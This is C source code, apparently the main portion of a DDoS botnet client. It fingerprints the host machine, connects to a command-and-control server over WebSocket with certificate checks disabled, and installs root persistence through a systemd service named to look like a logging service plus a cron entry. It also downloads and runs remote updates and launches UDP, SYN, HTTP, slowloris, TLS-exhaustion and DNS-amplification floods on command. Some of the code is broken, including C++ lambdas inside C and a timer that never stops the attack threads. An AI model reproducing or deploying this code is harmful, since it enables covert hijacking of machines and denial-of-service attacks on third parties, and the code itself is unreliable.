    FILE *mid = fopen("/etc/machine-id", "r");
    if (mid) { char s[64]; fscanf(mid, "%63s", s); strcat(raw, s); fclose(mid); }
    struct ifaddrs *ifa;
    if (getifaddrs(&ifa) == 0) {
        for (struct ifaddrs *p = ifa; p; p = p->ifa_next)
            if (p->ifa_addr && p->ifa_addr->sa_family == AF_INET && !(p->ifa_flags & IFF_LOOPBACK)) {
                char mac[18];
                char path[128];
                snprintf(path, sizeof(path), "/sys/class/net/%s/address", p->ifa_name);
                FILE *mf = fopen(path, "r");
                if (mf) { fscanf(mf, "%17s", mac); strcat(raw, mac); fclose(mf); }
                break;
            }
        freeifaddrs(ifa);
    }
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char *)raw, strlen(raw), hash);
    for (int i = 0; i < 8; i++) snprintf(info->hwid + i * 2, 3, "%02x", hash[i]);

    info->cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
    struct sysinfo si;
    if (sysinfo(&si) == 0) info->ram_mb = si.totalram * si.mem_unit / (1024 * 1024);
    info->net_mbps = 1000;

    FILE *osrel = fopen("/etc/os-release", "r");
    if (osrel) {
        char line[256];
        while (fgets(line, sizeof(line), osrel))
            if (strstr(line, "PRETTY_NAME=")) {
                char *s = strchr(line, '"') + 1;
                char *e = strrchr(line, '"');
                if (e) *e = 0;
                strncpy(info->os_ver, s, sizeof(info->os_ver) - 1);
            }
        fclose(osrel);
    }
}

/* ── WebSocket Client ──────────────────────────── */
typedef struct {
    int sockfd;
    SSL *ssl;
    SSL_CTX *ctx;
    char host[256], path[256];
    int port, use_ssl;
    pthread_mutex_t sm, rm;
} WS;

static int ws_connect(WS *ws, const char *bot_id) {
    struct addrinfo hints = {0}, *res;
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    char ps[8]; snprintf(ps, sizeof(ps), "%d", ws->port);
    if (getaddrinfo(ws->host, ps, &hints, &res) != 0) return -1;
    ws->sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (ws->sockfd < 0) { freeaddrinfo(res); return -1; }
    int f = 1;
    setsockopt(ws->sockfd, IPPROTO_TCP, TCP_NODELAY, &f, sizeof(f));
    struct timeval tv = {5, 0};
    setsockopt(ws->sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(ws->sockfd, res->ai_addr, res->ai_addrlen) < 0) {
        close(ws->sockfd); freeaddrinfo(res); return -1;
    }
    freeaddrinfo(res);

    if (ws->use_ssl) {
        SSL_library_init(); SSL_load_error_strings();
        ws->ctx = SSL_CTX_new(TLS_client_method());
        SSL_CTX_set_verify(ws->ctx, SSL_VERIFY_NONE, NULL);
        ws->ssl = SSL_new(ws->ctx);
        SSL_set_fd(ws->ssl, ws->sockfd);
        if (SSL_connect(ws->ssl) != 1) { ws->sockfd = -1; return -1; }
    }

    char req[1024];
    snprintf(req, sizeof(req),
        "GET %s%s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n",
        ws->path, bot_id, ws->host);

    if (ws->use_ssl) SSL_write(ws->ssl, req, strlen(req));
    else send(ws->sockfd, req, strlen(req), MSG_NOSIGNAL);

    char resp[4096];
    int n = ws->use_ssl ? SSL_read(ws->ssl, resp, sizeof(resp) - 1) : recv(ws->sockfd, resp, sizeof(resp) - 1, 0);
    if (n <= 0 || !strstr(resp, "101")) { ws->sockfd = -1; return -1; }
    return 0;
}

static void ws_disconnect(WS *ws) {
    if (ws->ssl) { SSL_shutdown(ws->ssl); SSL_free(ws->ssl); ws->ssl = NULL; }
    if (ws->ctx) { SSL_CTX_free(ws->ctx); ws->ctx = NULL; }
    if (ws->sockfd >= 0) { close(ws->sockfd); ws->sockfd = -1; }
}

static int ws_send(WS *ws, const char *msg) {
    pthread_mutex_lock(&ws->sm);
    size_t len = strlen(msg);
    unsigned char frame[14];
    int hdr_len;
    if (len <= 125) { frame[0] = 0x81; frame[1] = len; hdr_len = 2; }
    else if (len <= 65535) { frame[0] = 0x81; frame[1] = 126; frame[2] = (len >> 8) & 0xFF; frame[3] = len & 0xFF; hdr_len = 4; }
    else { frame[0] = 0x81; frame[1] = 127; for (int i = 7; i >= 0; i--) frame[2 + 7 - i] = (len >> (i * 8)) & 0xFF; hdr_len = 10; }

    int r;
    if (ws->use_ssl) {
        r = SSL_write(ws->ssl, frame, hdr_len);
        if (r == hdr_len) r = SSL_write(ws->ssl, msg, len);
    } else {
        struct iovec iov[2] = {{frame, hdr_len}, {(void *)msg, len}};
        struct msghdr mh = {0, 0, iov, 2, 0, 0, 0};
        r = sendmsg(ws->sockfd, &mh, MSG_NOSIGNAL);
    }
    pthread_mutex_unlock(&ws->sm);
    return r;
}

static int ws_recv(WS *ws, char *buf, int cap) {
    pthread_mutex_lock(&ws->rm);
    unsigned char h[2];
    int n = ws->use_ssl ? SSL_read(ws->ssl, h, 2) : recv(ws->sockfd, h, 2, 0);
    if (n != 2) { pthread_mutex_unlock(&ws->rm); return -1; }
    uint8_t op = h[0] & 0x0F, masked = (h[1] & 0x80) != 0;
    uint64_t plen = h[1] & 0x7F;
    if (plen == 126) { unsigned char e[2]; ws->use_ssl ? SSL_read(ws->ssl, e, 2) : recv(ws->sockfd, e, 2, 0); plen = (e[0] << 8) | e[1]; }
    else if (plen == 127) { unsigned char e[8]; ws->use_ssl ? SSL_read(ws->ssl, e, 8) : recv(ws->sockfd, e, 8, 0); plen = 0; for (int i = 0; i < 8; i++) plen = (plen << 8) | e[i]; }
    unsigned char mk[4] = {0};
    if (masked) { ws->use_ssl ? SSL_read(ws->ssl, mk, 4) : recv(ws->sockfd, mk, 4, 0); }
    unsigned char *py = malloc(plen);
    size_t rc = 0;
    while (rc < plen) {
        int r = ws->use_ssl ? SSL_read(ws->ssl, py + rc, plen - rc) : recv(ws->sockfd, py + rc, plen - rc, 0);
        if (r <= 0) { free(py); pthread_mutex_unlock(&ws->rm); return -1; }
        rc += r;
    }
    if (masked) for (uint64_t i = 0; i < plen; i++) py[i] ^= mk[i % 4];
    if (op == 0x9) { /* pong */ free(py); pthread_mutex_unlock(&ws->rm); return ws_recv(ws, buf, cap); }
    if (op == 0x8) { free(py); pthread_mutex_unlock(&ws->rm); return -1; }
    int cp = (int)plen < cap ? (int)plen : cap - 1;
    memcpy(buf, py, cp); buf[cp] = 0;
    free(py);
    pthread_mutex_unlock(&ws->rm);
    return cp;
}

/* ── JSON Helpers ──────────────────────────────── */
static int json_int(const char *msg, const char *key) {
    char k[128]; snprintf(k, sizeof(k), "\"%s\":", key);
    const char *p = strstr(msg, k);
    if (!p) return 0;
    return atoi(p + strlen(k));
}

static void json_str(const char *msg, const char *key, char *out, int cap) {
    char k[128]; snprintf(k, sizeof(k), "\"%s\":\"", key);
    const char *p = strstr(msg, k);
    if (!p) { out[0] = 0; return; }
    p += strlen(k);
    const char *e = strchr(p, '"');
    if (!e) { out[0] = 0; return; }
    int len = (int)(e - p);
    if (len >= cap) len = cap - 1;
    memcpy(out, p, len); out[len] = 0;
}

/* ── Persistence ───────────────────────────────── */
static void install_persistence(const char *path) {
    char svc[1024];
    snprintf(svc, sizeof(svc),
        "[Unit]\nDescription=System Logging Service\nAfter=network.target\n\n"
        "[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=10\n"
        "User=root\nWorkingDirectory=/\nStandardOutput=null\nStandardError=null\n\n"
        "[Install]\nWantedBy=multi-user.target\n", path);
    FILE *f = fopen("/etc/systemd/system/systemd-log.service", "w");
    if (f) { fwrite(svc, 1, strlen(svc), f); fclose(f); }
    system("systemctl daemon-reload 2>/dev/null");
    system("systemctl enable systemd-log.service 2>/dev/null");
    system("systemctl start systemd-log.service 2>/dev/null");
    char cron[512];
    snprintf(cron, sizeof(cron), "@reboot %s >/dev/null 2>&1\n", path);
    f = fopen("/etc/cron.d/system-log", "w");
    if (f) { fwrite(cron, 1, strlen(cron), f); fclose(f); }
    system("chmod 644 /etc/cron.d/system-log 2>/dev/null");
}

/* ── GitHub Auto-Update ────────────────────────── */
static void check_updates(const char *ver) {
    FILE *p = popen(
        "curl -s 'https://api.github.com/repos/YOUR_ORG/bot/releases/latest' 2>/dev/null | "
        "grep tag_name | head -1 | cut -d'\"' -f4", "r");
    if (!p) return;
    char latest[64] = {0};
    fread(latest, 1, sizeof(latest) - 1, p);
    pclose(p);
    latest[strcspn(latest, "\n")] = 0;
    if (latest[0] && strcmp(latest, ver) != 0) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
            "curl -sL 'https://github.com/YOUR_ORG/bot/releases/download/%s/bot_static' "
            "-o /tmp/bot_update && chmod +x /tmp/bot_update && "
            "mv /tmp/bot_update /usr/bin/systemd-log && /usr/bin/systemd-log &",
            latest);
        system(cmd);
        exit(0);
    }
}

/* ================================================================
 * MAIN
 * ================================================================ */
static volatile int g_shutdown = 0;
static void sig_handler(int sig) { g_shutdown = 1; }

int main(int argc, char *argv[]) {
    signal(SIGINT, sig_handler); signal(SIGTERM, sig_handler); signal(SIGPIPE, SIG_IGN);

    /* Daemonize */
    if (fork() > 0) return 0;
    setsid();
    if (fork() > 0) return 0;
    chdir("/");
    fclose(stdin); fclose(stdout); fclose(stderr);

    /* Max priority + lock memory */
    nice(-20);
    mlockall(MCL_CURRENT | MCL_FUTURE);

    /* Config */
    Config cfg = {0};
    strcpy(cfg.c2_host, argc > 1 ? argv[1] : "api.your-domain.com");
    cfg.c2_port = argc > 2 ? atoi(argv[2]) : 443;
    strcpy(cfg.c2_path, "/ws/bot/");
    cfg.use_ssl = 1;
    cfg.heartbeat_int = 10;
    cfg.reconnect_min = 5; cfg.reconnect_max = 300; cfg.stale_timeout = 60;
    cfg.default_pps = 100000; cfg.default_threads = 100;
    strcpy(cfg.bot_version, "4.0.0-ultimate");

    /* System info */
    SysInfo info = {0};
    sys_info(&info);

    /* Persistence */
    char self[1024];
    readlink("/proc/self/exe", self, sizeof(self) - 1);
    install_persistence(self);
    check_updates(cfg.bot_version);

    /* Pre-gen payloads */
    gen_payloads();

    /* ── Main C2 loop ──────────────────────────── */
    while (!g_shutdown) {
        WS ws = {0};
        strcpy(ws.host, cfg.c2_host);
        ws.port = cfg.c2_port;
        strcpy(ws.path, cfg.c2_path);
        ws.use_ssl = cfg.use_ssl;
        pthread_mutex_init(&ws.sm, NULL);
        pthread_mutex_init(&ws.rm, NULL);

        if (ws_connect(&ws, info.hwid) != 0) {
            int bo = cfg.reconnect_min;
            while (!g_shutdown) {
                sleep(bo);
                bo = bo * 2 < cfg.reconnect_max ? bo * 2 : cfg.reconnect_max;
                if (ws_connect(&ws, info.hwid) == 0) break;
            }
            if (g_shutdown) break;
        }

        /* Handshake */
        char hs[1024];
        snprintf(hs, sizeof(hs),
            "{\"type\":\"handshake\",\"bot_identifier\":\"%s\",\"ip_address\":\"%s\","
            "\"os_name\":\"Linux\",\"os_version\":\"%s\",\"cpu_cores\":%d,"
            "\"ram_total_mb\":%d,\"net_speed_mbps\":%d,\"version\":\"%s\"}",
            info.hwid, info.ip_addr, info.os_ver, info.cpu_cores, info.ram_mb,
            info.net_mbps, cfg.bot_version);
        ws_send(&ws, hs);

        time_t last_hb = time(NULL);
        AttackParams atk = {0};
        int atk_running = 0;

        while (!g_shutdown) {
            if (time(NULL) - last_hb >= cfg.heartbeat_int) {
                char hb[256];
                snprintf(hb, sizeof(hb), "{\"type\":\"heartbeat\",\"timestamp\":%ld}", time(NULL));
                ws_send(&ws, hb);
                last_hb = time(NULL);
            }

            char buf[4096];
            int n = ws_recv(&ws, buf, sizeof(buf));
            if (n < 0) {
                if (time(NULL) - last_hb > cfg.stale_timeout) break;
                usleep(100000);
                continue;
            }

            char type[64] = {0};
            json_str(buf, "type", type, sizeof(type));

            if (!strcmp(type, "config_update") || !strcmp(type, "config")) {
                int pps = json_int(buf, "max_pps");
                int th = json_int(buf, "max_threads");
                if (pps > 0) cfg.default_pps = pps;
                if (th > 0) cfg.default_threads = th;
            }
            else if (!strcmp(type, "attack")) {
                memset(&atk, 0, sizeof(atk));
                json_str(buf, "target", atk.target, sizeof(atk.target));
                atk.port = json_int(buf, "port");
                json_str(buf, "method", atk.method, sizeof(atk.method));
                atk.duration_secs = json_int(buf, "duration");
                atk.max_pps = json_int(buf, "max_pps");
                atk.max_threads = json_int(buf, "max_threads");
                atk.spoof_mode = json_int(buf, "spoof_mode");
                atk.fragmentation = json_int(buf, "fragmentation");
                atk.slowloris = json_int(buf, "slowloris");
                atk.tls_exhaust = json_int(buf, "tls_exhaust");
                atk.dns_amp = json_int(buf, "dns_amp");
                atk.game_mimic = json_int(buf, "game_mimic");
                atk.mega_mode = json_int(buf, "mega_mode");
                if (!atk.max_pps) atk.max_pps = cfg.default_pps;
                if (!atk.max_threads) atk.max_threads = cfg.default_threads;
                if (!atk.method[0]) strcpy(atk.method, "UDP");

                if (atk.mega_mode) {
                    /* MEGA mode: fjium-pps full power */
                    int cores = get_nprocs();
                    int threads = cores * THREAD_MULTIPLIER;
                    int *socks = calloc(MAX_SOCKETS, sizeof(int));
                    int sock_cnt = 0;
                    for (int i = 0; i < MAX_SOCKETS; i++) {
                        int s = create_udp_socket();
                        if (s < 0) break;
                        socks[sock_cnt++] = s;
                    }
                    struct sockaddr_in ta = {0};
                    ta.sin_family = AF_INET;
                    ta.sin_port = htons(atk.port);
                    inet_pton(AF_INET, atk.target, &ta.sin_addr);

                    pthread_t *tids = calloc(threads, sizeof(pthread_t));
                    MegaThread *mt = calloc(threads, sizeof(MegaThread));
                    pthread_attr_t attr;
                    pthread_attr_init(&attr);
                    pthread_attr_setstacksize(&attr, 8 * 1024 * 1024);
                    int spth = sock_cnt / threads;
                    for (int i = 0; i < threads; i++) {
                        mt[i].socks = &socks[i * spth];
                        mt[i].sock_count = (i == threads - 1) ? sock_cnt - (i * spth) : spth;
                        mt[i].target = ta;
                        mt[i].duration = atk.duration_secs;
                        mt[i].cpu_id = i;
                        pthread_create(&tids[i], &attr, mega_worker, &mt[i]);
                    }
                    pthread_attr_destroy(&attr);
                    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
                    for (int i = 0; i < sock_cnt; i++) close(socks[i]);
                    free(socks); free(tids); free(mt);
                } else {
                    /* Standard mode */
                    struct sockaddr_in ta = {0};
                    ta.sin_family = AF_INET;
                    ta.sin_port = htons(atk.port);
                    inet_pton(AF_INET, atk.target, &ta.sin_addr);

                    TokenBucket tb;
                    tb_init(&tb, atk.max_pps, atk.max_pps * 2);

                    int nc = atk.max_threads;
                    if (nc > get_nprocs()) nc = get_nprocs();
                    if (nc < 1) nc = 1;

                    pthread_t *tids = malloc(nc * sizeof(pthread_t));
                    atk_running = 1;

                    for (int i = 0; i < nc; i++) {
                        int cpu = i % get_nprocs();
                        AttackParams *ap = malloc(sizeof(AttackParams));
                        memcpy(ap, &atk, sizeof(AttackParams));
                        TokenBucket *tbp = malloc(sizeof(TokenBucket));
                        memcpy(tbp, &tb, sizeof(TokenBucket));

                        pthread_create(&tids[i], NULL, (void *(*)(void *))(
                            [](void *arg) -> void * {
                                struct { AttackParams *ap; TokenBucket *tb; struct sockaddr_in ta; int cpu; } *a = arg;
                                cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(a->cpu, &cs);
                                pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

                                if (!strcmp(a->ap->method, "UDP")) udp_flood(a->ta, a->ap, a->tb);
                                else if (!strcmp(a->ap->method, "SYN")) syn_flood(a->ta, a->ap, a->tb);
                                else if (!strcmp(a->ap->method, "TCP")) tcp_flood(a->ta, a->ap, a->tb);
                                else if (!strcmp(a->ap->method, "HTTP")) http_flood(a->ta, a->ap, a->tb);
                                else if (!strcmp(a->ap->method, "MIX")) mixed(a->ta, a->ap, a->tb);
                                else if (!strcmp(a->ap->method, "ICMP")) icmp_flood(a->ta, a->ap, a->tb);
                                else if (a->ap->slowloris) slowloris(a->ta, a->ap, a->tb);
                                else if (a->ap->tls_exhaust) tls_exhaust(a->ta, a->ap, a->tb);
                                else if (a->ap->dns_amp) dns_amp(a->ta, a->ap, a->tb);
                                else if (a->ap->game_mimic) game_mimic(a->ta, a->ap, a->tb);
                                else udp_flood(a->ta, a->ap, a->tb);
                                free(a->ap); free(a->tb); free(a);
                                return NULL;
                            }), &(struct { AttackParams *ap; TokenBucket *tb; struct sockaddr_in ta; int cpu; }){ap, tbp, ta, cpu});
                    }

                    /* Auto-stop timer */
                    pthread_t timer;
                    pthread_create(&timer, NULL, (void *(*)(void *))(
                        [](void *arg) -> void * {
                            sleep(*(int *)arg);
                            *(volatile int *)((int *)arg + 1) = 0;
                            return NULL;
                        }), &(struct { int dur; volatile int running; }){atk.duration_secs, 1});

                    for (int i = 0; i < nc; i++) pthread_join(tids[i], NULL);
                    pthread_join(timer, NULL);
                    free(tids);
                    atk_running = 0;
                }
            }
            else if (!strcmp(type, "stop")) {
                atk.duration_secs = 0;
                atk_running = 0;
            }
            else if (!strcmp(type, "ban")) {
                g_shutdown = 1;
                break;
            }
        }
        ws_disconnect(&ws);
    }
    return 0;
}